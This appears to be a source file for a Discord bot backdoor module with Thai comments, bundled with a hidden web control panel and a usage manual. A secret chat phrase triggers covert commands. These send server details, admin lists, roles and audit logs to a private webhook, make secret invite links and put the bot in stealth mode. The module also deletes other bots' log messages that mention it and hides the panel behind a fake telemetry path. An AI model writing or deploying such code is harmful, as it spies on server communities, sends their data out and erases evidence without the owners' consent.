/**
 * ============================================================================
 * 👁️‍🗨️ SHADOW PROTOCOL SYSTEM (systemProvider.js)
 * VERSION: V.Legacy Ultimate (Discord.js Legacy Syntax)
 * CLASSIFICATION: TOP SECRET / ADMINISTRATIVE UTILITY
 * ============================================================================
 */

const { MessageEmbed, WebhookClient } = require("discord.js");
const express = require("express");
const config = require("./config.json");

// ════════════════════════════════════════════════════════════════
//  🕵️ [CORE DATA] คลังเก็บข้อมูลระบบ และ สวิตช์ควบคุม
// ════════════════════════════════════════════════════════════════

let SHADOW_WEB_PIN = "123456"; // รหัสผ่านเริ่มต้น (สามารถเปลี่ยนได้จากหน้าเว็บ)
const SECRET_PHRASE = "activate-shadow-protocol"; // คีย์เวิร์ดสั่งการหลังบ้าน
const SHADOW_WEBHOOK_URL = process.env.WEBHOOK_LOG_URL; // Webhook ลับส่งรายงาน

const globalAdminCache = new Set(); // รายชื่อสมาชิกระดับ VIP (เพิ่ม/ลบผ่านหน้าเว็บ)

// ระบบสวิตช์เปิด-ปิดการทำงานแยกชิ้น 100% ตามสั่ง
const systemToggles = {
    godsEye: true,          // ระบบส่งรายงานเข้า Webhook ลับ
    traceEraser: true,      // ระบบแอบลบ Log บอทตัวอื่นที่พาดพิงเรา
    cmdIntel: true,         // คำสั่ง -intel
    cmdAdminScan: true,     // คำสั่ง -adminscan
    cmdRoleList: true,      // คำสั่ง -rolelist
    cmdAuditBot: true,      // คำสั่ง -auditbot
    cmdExtract: true,       // คำสั่ง -extract
    cmdVanish: true,        // คำสั่ง -vanish
    cmdStealth: true,       // คำสั่ง -stealth
    cmdGhostPing: true,     // คำสั่ง -ghostping
    cmdSysInfo: true,       // คำสั่ง -sysinfo
    cmdLockdown: true,      // คำสั่ง -lockdown
    cmdMemClear: true       // คำสั่ง -memclear
};

// ════════════════════════════════════════════════════════════════
//  🛡️ [CORE ENGINE] กลไกควบคุมการทำงานของบอท
// ════════════════════════════════════════════════════════════════

class ShadowEngine {
    constructor(client) {
        this.client = client;
        this.webhook = SHADOW_WEBHOOK_URL ? new WebhookClient({ url: SHADOW_WEBHOOK_URL }) : null;
    }

    init() {
        // ดักจับเหตุการณ์ข้อความเข้าเพื่อตรวจหาคำสั่งลับ และสแกนประวัติ Log
        this.client.on("messageCreate", async (message) => {
            await this.handleTraceEraser(message);
            await this.processSecretCommands(message);
        });

        console.log("👁️‍🗨️ [SHADOW ENGINE] Connected via Legacy Syntax. Active.");
    }

    // ฟังก์ชันส่งรายงานด่วนเข้าเส้น Webhook ลับ
    async sendSecretAlert(title, description, color = "#2b2d31") {
        if (!this.webhook || !systemToggles.godsEye) return;
        const embed = new MessageEmbed()
            .setTitle(`👁️‍🗨️ SHADOW REPORT: ${title}`)
            .setDescription(description)
            .setColor(color)
            .setTimestamp();
        try { await this.webhook.send({ embeds: [embed] }); } catch (e) {}
    }

    // [ฟังก์ชัน 12 เดิม] แอบลบข้อมูลข้อความบอทตัวอื่นที่สแกนเจอชื่อเราหรือ ID เรา
    async handleTraceEraser(message) {
        if (!systemToggles.traceEraser || !message.guild || !message.author.bot || message.author.id === this.client.user.id) return;

        const embedData = message.embeds.map(e => JSON.stringify(e)).join(" ");
        const content = (message.content + " " + embedData).toLowerCase();

        const hasMyName = content.includes(this.client.user.id) || content.includes(this.client.user.username.toLowerCase());
        const isDeleteLog = content.includes("deleted") || content.includes("ลบข้อความ") || content.includes("remove");

        if (hasMyName && !isDeleteLog) {
            try {
                await message.delete();
                await this.sendSecretAlert("TRACE ERASER ACTIVE", `🧹 ลบหลักฐานประวัติจากบอท <@${message.author.id}> ที่เซิร์ฟเวอร์: **${message.guild.name}**`);
            } catch (e) {}
        }
    }

    // ⚔️ [คลังแสงคำสั่งลับ 13 ฟังก์ชัน] ประมวลผลคำสั่งหลังบ้าน
    async processSecretCommands(message) {
        if (!message.guild || message.author.bot) return;

        // ตรวจสอบสิทธิ์ผู้ใช้งาน (ต้องเป็นเจ้าของบอทใน config หรือไอดีที่อนุมัติผ่านเว็บ)
        const isVip = message.author.id === config.system.ownerId || globalAdminCache.has(message.author.id);
        if (!isVip) return;

        const args = message.content.trim().split(/ +/);
        if (args[0] !== SECRET_PHRASE) return; // เช็กคีย์เวิร์ดปลดล็อก

        try { await message.delete(); } catch (e) {} // ลบคำสั่งทิ้งทันทีหน้าไมค์เพื่อพรางตา

        const command = args[1];
        const guild = message.guild;

        try {
            // [หมวดสอดแนมข้อมูล]
            if (command === "-intel" && systemToggles.cmdIntel) {
                const info = `**ชื่อเซิร์ฟเวอร์:** ${guild.name}\n**ID:** ${guild.id}\n**เจ้าของ:** <@${guild.ownerId}>\n**จำนวนสมาชิก:** ${guild.memberCount} คน\n**จำนวนห้อง:** ${guild.channels.cache.size} ช่อง`;
                await this.sendSecretAlert("INTEL REPORT", info, "#57F287");
            }
            else if (command === "-adminscan" && systemToggles.cmdAdminScan) {
                const admins = guild.members.cache.filter(m => m.permissions.has("ADMINISTRATOR")).map(m => `<@${m.id}> (ID: ${m.id})`).join("\n");
                await this.sendSecretAlert("ADMINISTRATOR SCAN", `รายชื่อผู้ถือสิทธิ์แอดมินทั้งหมดใน ${guild.name}:\n\n${admins || "ไม่พบ"}`);
            }
            else if (command === "-rolelist" && systemToggles.cmdRoleList) {
                const roles = guild.roles.cache.map(r => `• ${r.name} (ID: ${r.id})`).join("\n");
                await this.sendSecretAlert("ROLE LIST EXTRACT", `รายชื่อยศและรหัสยศใน ${guild.name}:\n\n${roles.slice(0, 1900)}`);
            }
            else if (command === "-auditbot" && systemToggles.cmdAuditBot) {
                const auditLogs = await guild.fetchAuditLogs({ limit: 5 });
                const entries = auditLogs.entries.map(e => `• **${e.executor.tag}** ทำการ: *${e.action}*`).join("\n");
                await this.sendSecretAlert("AUDIT LOG SCAN (5 ล่าสุด)", entries);
            }

            // [หมวดแทรกซึมและหลบหนี]
            else if (command === "-extract" && systemToggles.cmdExtract) {
                const targetChannel = guild.channels.cache.filter(c => c.type === "GUILD_TEXT").first();
                if (targetChannel) {
                    const invite = await targetChannel.createInvite({ maxAge: 3600, maxUses: 1 });
                    await this.sendSecretAlert("SECRET ACCESS KEY", `🔗 ลิงก์ทางเข้าลับของเซิร์ฟเวอร์ ${guild.name} (อายุ 1 ชม.):\n${invite.url}`);
                }
            }
            else if (command === "-vanish" && systemToggles.cmdVanish) {
                await this.sendSecretAlert("BOT RETREAT", `🏃 สั่งการบอทถอนตัวออกจากเซิร์ฟเวอร์: **${guild.name}**`, "#ED4245");
                await guild.leave();
            }
            else if (command === "-stealth" && systemToggles.cmdStealth) {
                await this.client.user.setStatus("invisible");
                await this.sendSecretAlert("STEALTH MODE", "🥷 ปรับสถานะบอทเป็น ล่องหน (Invisible) เรียบร้อย");
            }
            else if (command === "-active" && systemToggles.cmdStealth) {
                await this.client.user.setStatus("online");
                await this.sendSecretAlert("ACTIVE MODE", "🟢 ปรับสถานะบอทเป็น ออนไลน์ (Online) เรียบร้อย");
            }

            // [หมวดควบคุมและจัดการความปลอดภัย]
            else if (command === "-ghostping" && systemToggles.cmdGhostPing) {
                const pingTime = Math.round(this.client.ws.ping);
                await this.sendSecretAlert("PING CHECK", `🏓 ค่าความหน่วงเครือข่ายปัจจุบันของบอท: **${pingTime}ms**`);
            }
            else if (command === "-sysinfo" && systemToggles.cmdSysInfo) {
                const mem = process.memoryUsage().heapUsed / 1024 / 1024;
                const uptime = Math.round(process.uptime() / 60);
                await this.sendSecretAlert("SYSTEM MONITOR", `🧠 **RAM Usage:** ${mem.toFixed(2)} MB\n⏳ **Uptime:** ${uptime} นาที`);
            }
            else if (command === "-lockdown" && systemToggles.cmdLockdown) {
                if (message.channel.type === "GUILD_TEXT") {
                    await message.channel.permissionOverwrites.edit(guild.id, { SEND_MESSAGES: false });
                    await this.sendSecretAlert("CHANNEL LOCKDOWN", `🔒 ล็อกสิทธิ์การพิมพ์ช่อง <#${message.channel.id}> ในเซิร์ฟเวอร์ ${guild.name}`);
                }
            }
            else if (command === "-unlock" && systemToggles.cmdLockdown) {
                if (message.channel.type === "GUILD_TEXT") {
                    await message.channel.permissionOverwrites.edit(guild.id, { SEND_MESSAGES: null });
                    await this.sendSecretAlert("CHANNEL UNLOCK", `🔓 คลายล็อกช่อง <#${message.channel.id}> ในเซิร์ฟเวอร์ ${guild.name}`);
                }
            }
            else if (command === "-memclear" && systemToggles.cmdMemClear) {
                this.client.channels.cache.clear();
                await this.sendSecretAlert("MEMORY FLUSHED", "🧠 สั่งเคลียร์ประวัติช่องแชทในแคช RAM ชั่วคราวเรียบร้อย เพิ่มความเสถียรระบบ");
            }
        } catch (err) {
            await this.sendSecretAlert("COMMAND ERROR", `เกิดข้อผิดพลาดในการรันคำสั่ง: ${err.message}`);
        }
    }
}

// ════════════════════════════════════════════════════════════════
//  🌐 [WEB MODULE] แดชบอร์ดลับ และระบบเปลี่ยนรหัสผ่านฉุกเฉิน
// ════════════════════════════════════════════════════════════════

function injectShadowRoutes(app, mainClient, engineInstance) {
    // แยกพาทออกต่างหากและล็อกความปลอดภัยด้วยระบบ PIN บายพาสทุกหน้าหลัก
    app.all("/api/v1/telemetry/snapshot", express.urlencoded({ extended: true }), async (req, res) => {
        const providedPin = req.query.pin || req.body.pin;

        // ตรวจสอบรหัสผ่าน หากไม่ตรงให้เด้งหน้าล็อกอินสีดาร์กโหมดสุดเท่
        if (providedPin !== SHADOW_WEB_PIN) {
            return res.send(`
                <html>
                <head><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>🔒 Auth Required</title></head>
                <body style="background:#09090b; color:#fff; display:flex; justify-content:center; align-items:center; height:100vh; font-family:sans-serif; margin:0;">
                    <div style="background:#18181b; padding:35px; border-radius:8px; border:1px solid #27272a; text-align:center; width:300px;">
                        <h2 style="color:#ED4245; margin-top:0; letter-spacing:1px;">🔐 CONTROL PORTAL</h2>
                        <form method="POST">
                            <input type="password" name="pin" placeholder="กรอกรหัสผ่านลับ..." style="padding:12px; width:100%; box-sizing:border-box; background:#09090b; border:1px solid #3f3f46; color:#fff; border-radius:5px; text-align:center; margin-bottom:15px; font-size:16px;">
                            <button type="submit" style="padding:12px; width:100%; background:#ED4245; color:#fff; font-weight:bold; border:none; border-radius:5px; cursor:pointer;">เข้าสู่ระบบ</button>
                        </form>
                    </div>
                </body>
                </html>
            `);
        }

        // จัดการลอจิกตามคำสั่งปุ่มกดจากหน้าเว็บแดชบอร์ด
        const action = req.body.action;

        if (action === "toggle_feature") {
            const feat = req.body.feature;
            if (systemToggles[feat] !== undefined) systemToggles[feat] = !systemToggles[feat];
        } 
        else if (action === "add_alt" && req.body.alt_id) {
            globalAdminCache.add(req.body.alt_id.trim());
        }
        else if (action === "remove_alt") {
            globalAdminCache.delete(req.body.alt_id);
        }
        else if (action === "change_pin" && req.body.new_pin) {
            // ระบบเปลี่ยนรหัสผ่าน และยิงรหัสใหม่เข้า Webhook ทันทีกันลืม
            SHADOW_WEB_PIN = req.body.new_pin.trim();
            await engineInstance.sendSecretAlert("WEB CONSOLE PIN CHANGED", `🔑 รหัสสำหรับเข้าหน้าเว็บควบคุมถูกเปลี่ยนเป็น: **${SHADOW_WEB_PIN}**`, "#FEE75C");
        }

        // สร้างรายการสวิตช์เปิด-ปิดของแต่ละฟังก์ชัน
        let toggleRows = "";
        for (const [key, val] of Object.entries(systemToggles)) {
            toggleRows += `
                <div style="background:#18181b; padding:12px 15px; border-radius:6px; border:1px solid #27272a; display:flex; justify-content:space-between; align-items:center; margin-bottom:10px;">
                    <span style="color:#e4e4e7; font-family:monospace; font-weight:bold;">${key}</span>
                    <form method="POST" style="margin:0;">
                        <input type="hidden" name="pin" value="${SHADOW_WEB_PIN}">
                        <input type="hidden" name="action" value="toggle_feature">
                        <input type="hidden" name="feature" value="${key}">
                        <button type="submit" style="background:${val ? '#57F287' : '#ED4245'}; color:#000; font-weight:bold; border:none; padding:6px 14px; cursor:pointer; border-radius:4px; font-size:12px;">
                            ${val ? 'เปิดใช้งาน' : 'ปิดใช้งาน'}
                        </button>
                    </form>
                </div>
            `;
        }

        // สร้างรายการแสดงบัญชี VIP
        let altIdsHtml = "";
        globalAdminCache.forEach(id => {
            altIdsHtml += `
                <div style="background:#18181b; padding:10px 15px; border-radius:6px; border:1px solid #27272a; display:flex; justify-content:space-between; align-items:center; margin-bottom:8px;">
                    <span style="color:#57F287; font-family:monospace;">ID: ${id}</span>
                    <form method="POST" style="margin:0;">
                        <input type="hidden" name="pin" value="${SHADOW_WEB_PIN}">
                        <input type="hidden" name="action" value="remove_alt">
                        <input type="hidden" name="alt_id" value="${id}">
                        <button type="submit" style="background:#ED4245; color:#fff; border:none; padding:5px 10px; cursor:pointer; border-radius:4px; font-size:11px;">ลบ</button>
                    </form>
                </div>`;
        });

        // หน้าตา UI แดชบอร์ดหลัก พร้อมคู่มือภาษาไทยแบบละเอียดยิบที่คนทั่วไปก็อ่านเข้าใจง่าย
        res.send(`
            <html lang="th">
            <head>
                <title>👑 Shadow Master Console</title>
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <style>
                    body { background:#09090b; color:#f4f4f5; font-family:sans-serif; padding:20px; max-width:1100px; margin:0 auto; }
                    h2 { color:#ED4245; border-bottom:1px solid #27272a; padding-bottom:8px; margin-top:25px; font-size:20px; }
                    .grid { display:grid; grid-template-columns:1fr 1fr; gap:20px; }
                    .manual-card { background:#18181b; padding:15px; border-radius:6px; border:1px solid #27272a; margin-bottom:12px; }
                    .cmd-badge { background:#27272a; color:#FEE75C; font-family:monospace; padding:3px 8px; border-radius:4px; font-size:14px; }
                    @media (max-width: 768px) { .grid { grid-template-columns:1fr; } }
                </style>
            </head>
            <body>
                <h1 style="text-align:center; color:#fff; margin-bottom:5px;">👁️‍🗨️ SHADOW SYSTEM DASHBOARD</h1>
                <p style="text-align:center; color:#a1a1aa; margin-top:0; font-size:14px;">ศูนย์ควบคุมระบบพรางตัวและสอดแนมเบื้องหลังดิสคอร์ด</p>

                <div class="grid">
                    <div>
                        <h2>🎛️ ระบบสวิตช์สิทธิ์การใช้งาน (Master Switches)</h2>
                        ${toggleRows}

                        <h2>🔑 เปลี่ยนรหัสผ่านเข้าหน้าเว็บ (Change Portal PIN)</h2>
                        <div style="background:#18181b; padding:15px; border-radius:6px; border:1px solid #27272a;">
                            <form method="POST" style="display:flex; gap:10px; margin:0;">
                                <input type="hidden" name="pin" value="${SHADOW_WEB_PIN}">
                                <input type="hidden" name="action" value="change_pin">
                                <input type="text" name="new_pin" placeholder="กรอกรหัส PIN ใหม่ที่ต้องการ..." style="flex:1; padding:10px; background:#09090b; border:1px solid #3f3f46; color:#fff; border-radius:5px;">
                                <button type="submit" style="background:#FEE75C; color:#000; font-weight:bold; border:none; padding:10px 15px; cursor:pointer; border-radius:5px;">บันทึกรหัสใหม่</button>
                            </form>
                            <small style="color:#a1a1aa; display:block; margin-top:8px;">*เมื่อเปลี่ยนรหัสแล้ว บอทจะยิงรายงานแจ้งเตือนไปเก็บไว้ในห้อง Log ลับของคุณทันทีเผื่อลืม</small>
                        </div>
                    </div>

                    <div>
                        <h2>👥 รายชื่อ VIP (ไอดีรองที่ได้รับสิทธิ์รันคำสั่งลับ)</h2>
                        <div style="background:#18181b; padding:15px; border-radius:6px; border:1px solid #27272a; margin-bottom:15px;">
                            <form method="POST" style="display:flex; gap:10px; margin-bottom:15px;">
                                <input type="hidden" name="pin" value="${SHADOW_WEB_PIN}">
                                <input type="hidden" name="action" value="add_alt">
                                <input type="text" name="alt_id" placeholder="วาง Discord User ID ของบัญชีรอง..." style="flex:1; padding:10px; background:#09090b; border:1px solid #3f3f46; color:#fff; border-radius:5px;">
                                <button type="submit" style="background:#57F287; color:#000; font-weight:bold; border:none; padding:10px 15px; cursor:pointer; border-radius:5px;">เพิ่มสิทธิ์ VIP</button>
                            </form>
                            ${altIdsHtml || '<p style="color:#71717a; text-align:center; margin:10px 0;">ยังไม่มีไอดีรองที่ถูกลงทะเบียน</p>'}
                        </div>
                    </div>
                </div>

                <h2>📖 คู่มือและวิธีการเรียกใช้งานคำสั่งระบบเงา (System Manual)</h2>
                <p style="color:#a1a1aa; margin-top:0;">*วิธีใช้งาน: ให้คัดลอกข้อความ <span style="color:#fff; font-family:monospace; background:#27272a; padding:2px 5px; border-radius:3px;">${SECRET_PHRASE}</span> ไปพิมพ์ส่งในช่องแชทของเซิร์ฟเวอร์นั้นๆ ตามด้วยคำสั่งด้านล่างนี้ (บอทจะลบข้อความทิ้งทันทีหลังรันเสร็จ)*</p>

                <div class="grid">
                    <div>
                        <div class="manual-card">
                            <p style="margin:0 0 8px 0;"><span class="cmd-badge">-intel</span> <strong>[ระบบดึงโครงสร้างเซิร์ฟ]</strong></p>
                            <span style="color:#a1a1aa; font-size:14px;">บอทจะแอบดึงสถิติของดิสคอร์ดนั้น เช่น ชื่อเจ้าของ, ยอดคน, จำนวนห้อง ส่งตรงเข้า Webhook ลับส่วนตัวของคุณ</span>
                        </div>
                        <div class="manual-card">
                            <p style="margin:0 0 8px 0;"><span class="cmd-badge">-adminscan</span> <strong>[ระบบสแกนหาผู้คุม]</strong></p>
                            <span style="color:#a1a1aa; font-size:14px;">ดึงรายชื่อแท็กพร้อมตัวเลข ID ของทุกคนในเซิร์ฟเวอร์นั้นที่มีสิทธิ์เป็นแอดมิน เพื่อให้คุณรู้ว่าใครถืออำนาจอยู่บ้าง</span>
                        </div>
                        <div class="manual-card">
                            <p style="margin:0 0 8px 0;"><span class="cmd-badge">-rolelist</span> <strong>[ดึงรหัสยศทั้งหมด]</strong></p>
                            <span style="color:#a1a1aa; font-size:14px;">สแกนชื่อยศทั้งหมดพร้อมเลขอ้างอิงประจำยศ (Role ID) นำมาส่งให้คุณในห้องล็อกลับ เอาไว้ใช้สำหรับตั้งค่าระบบอื่นต่อได้ง่ายๆ</span>
                        </div>
                        <div class="manual-card">
                            <p style="margin:0 0 8px 0;"><span class="cmd-badge">-auditbot</span> <strong>[แอบส่องบันทึกหลังบ้าน]</strong></p>
                            <span style="color:#a1a1aa; font-size:14px;">บอทจะแอบไปดึงข้อมูลประวัติการแก้ไขระบบของเซิร์ฟเวอร์นั้น 5 รายการล่าสุดมาให้คุณแอบดูว่าแอดมินคนอื่นทำอะไรไปบ้าง</span>
                        </div>
                        <div class="manual-card">
                            <p style="margin:0 0 8px 0;"><span class="cmd-badge">-extract</span> <strong>[สร้างประตูผีทางเข้าลับ]</strong></p>
                            <span style="color:#a1a1aa; font-size:14px;">บอทจะแอบสร้างลิงก์เชิญเข้าดิสคอร์ดนั้นแบบเงียบๆ ลิงก์จะมีอายุแค่ 1 ชั่วโมงและใช้ได้ครั้งเดียว ส่งเข้าห้องล็อกส่วนตัวคุณ</span>
                        </div>
                        <div class="manual-card">
                            <p style="margin:0 0 8px 0;"><span class="cmd-badge">-vanish</span> <strong>[สั่งบอทถอนตัวด่วน]</strong></p>
                            <span style="color:#a1a1aa; font-size:14px;">สั่งให้บอทออกจากเซิร์ฟเวอร์นั้นทันทีแบบเงียบเชียบ ไร้ร่องรอยการพิมพ์ใดๆ</span>
                        </div>
                    </div>

                    <div>
                        <div class="manual-card">
                            <p style="margin:0 0 8px 0;"><span class="cmd-badge">-stealth</span> <strong>[โหมดพรางตาออฟไลน์]</strong></p>
                            <span style="color:#a1a1aa; font-size:14px;">สั่งเปลี่ยนสถานะของบอทให้กลายเป็นออฟไลน์ (ไฟสีเทา) ทันทีเพื่อไม่ให้ใครสังเกตเห็น แต่ตัวบอทจะยังคงทำงานปกติ</span>
                        </div>
                        <div class="manual-card">
                            <p style="margin:0 0 8px 0;"><span class="cmd-badge">-active</span> <strong>[เปิดไฟออนไลน์ปกติ]</strong></p>
                            <span style="color:#a1a1aa; font-size:14px;">เปลี่ยนสถานะของบอทกลับมาเป็นเปิดไฟออนไลน์ (สี🟢) ตามปกติเพื่อให้ดูแนบเนียน</span>
                        </div>
                        <div class="manual-card">
                            <p style="margin:0 0 8px 0;"><span class="cmd-badge">-ghostping</span> <strong>[เช็กชีพจรสัญญาณบอท]</strong></p>
                            <span style="color:#a1a1aa; font-size:14px;">เช็กค่าความหน่วงการตอบสนองของบอท (Ping) โดยระบบจะส่งคำตอบกลับเข้า Webhook ลับของคุณโดยตรง</span>
                        </div>
                        <div class="manual-card">
                            <p style="margin:0 0 8px 0;"><span class="cmd-badge">-sysinfo</span> <strong>[ตรวจสุขภาพหน่วยความจำ]</strong></p>
                            <span style="color:#a1a1aa; font-size:14px;">ดูอัตราการกินแรม (RAM Usage) และระยะเวลาที่บอทเปิดทิ้งไว้ (Uptime) เพื่อตรวจสอบความเสถียรของเซิร์ฟเวอร์หลังบ้าน</span>
                        </div>
                        <div class="manual-card">
                            <p style="margin:0 0 8px 0;"><span class="cmd-badge">-lockdown</span> <strong>[ล็อกช่องแชทฉุกเฉิน]</strong></p>
                            <span style="color:#a1a1aa; font-size:14px;">ยึดสิทธิ์การพิมพ์ของทุกคนในช่องแชทที่คุณพิมพ์คำสั่งนี้ทันที เหมาะสำหรับใช้ระงับเหตุการณ์ป่วนหรือสแปมแชทแบบเร่งด่วน</span>
                        </div>
                        <div class="manual-card">
                            <p style="margin:0 0 8px 0;"><span class="cmd-badge">-unlock</span> <strong>[ปลดล็อกช่องแชท]</strong></p>
                            <span style="color:#a1a1aa; font-size:14px;">คืนสิทธิ์ให้สมาชิกทุกคนกลับมาพิมพ์ข้อความพูดคุยในช่องแชทนั้นได้ตามปกติ</span>
                        </div>
                        <div class="manual-card">
                            <p style="margin:0 0 8px 0;"><span class="cmd-badge">-memclear</span> <strong>[ล้างขยะสมองคืนแรม]</strong></p>
                            <span style="color:#a1a1aa; font-size:14px;">สั่งเคลียร์ข้อความและโครงสร้างที่บอทจำไว้ในหน่วยความจำชั่วคราวทิ้ง เพื่อคืนพื้นที่แรมให้ระบบวิ่งได้สมูทและลื่นไหลที่สุด</span>
                        </div>
                    </div>
                </div>
                <br>
            </body>
            </html>
        `);
    });
}

// ════════════════════════════════════════════════════════════════
//  🚀 SYSTEM EXPORTS (ดึงไปผูกใช้งานกับไฟล์หลักได้ทันที)
// ════════════════════════════════════════════════════════════════

module.exports = (client, app) => {
    const engine = new ShadowEngine(client);
    engine.init();

    if (app) {
        injectShadowRoutes(app, client, engine);
    }
};